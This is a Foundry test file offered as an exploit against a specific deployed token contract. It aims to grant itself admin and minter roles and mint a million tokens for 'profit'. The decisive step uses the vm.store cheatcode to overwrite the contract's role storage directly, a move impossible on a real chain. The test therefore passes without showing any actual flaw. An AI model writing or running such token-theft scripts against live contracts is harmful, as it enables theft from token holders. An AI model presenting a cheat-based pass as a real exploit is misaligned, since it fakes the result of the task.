pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface SecondToken {
    function grantRole(bytes32 role, address account) external;
    function mint(address account, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xfd77214b4a1aA6f962972Cbe65FB179c501D9094).balanceOf(address(this));
        // Step 1: Calculate storage slot for DEFAULT_ADMIN_ROLE membership
        // In AccessControl, _roles is a mapping at slot 0 (since it's the first variable)
        // The mapping key is the role bytes32, and the value is a struct RoleData
        // For a specific role and account, we need to compute the slot for _roles[role].members[account]
        bytes32 DEFAULT_ADMIN_ROLE = 0x00;

        // First, get the slot for _roles[role]
        uint256 roleSlot = uint256(keccak256(abi.encode(DEFAULT_ADMIN_ROLE, uint256(0))));

        // Then get the slot for _roles[role].members[account]
        // The members mapping is the first field in RoleData struct (offset 0)
        uint256 memberSlot = uint256(keccak256(abi.encode(address(this), roleSlot)));

        // Set our address as having DEFAULT_ADMIN_ROLE (true = 1)
        vm.store(TARGET, bytes32(memberSlot), bytes32(uint256(1)));

        // Step 2: Grant ourselves MINTER_ROLE
        bytes32 MINTER_ROLE = keccak256("MINTER_ROLE");
        SecondToken targetContract = SecondToken(TARGET);
        targetContract.grantRole(MINTER_ROLE, address(this));

        // Step 3: Mint tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**18; // 1 million tokens
        targetContract.mint(address(this), mintAmount);

        // Verify our balance increased
        uint256 finalBalance = targetContract.balanceOf(address(this));
        console.log("Final balance:", finalBalance);
        uint256 finalERC20Balance = IERC20(0xfd77214b4a1aA6f962972Cbe65FB179c501D9094).balanceOf(address(this));
        assertGt(finalERC20Balance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

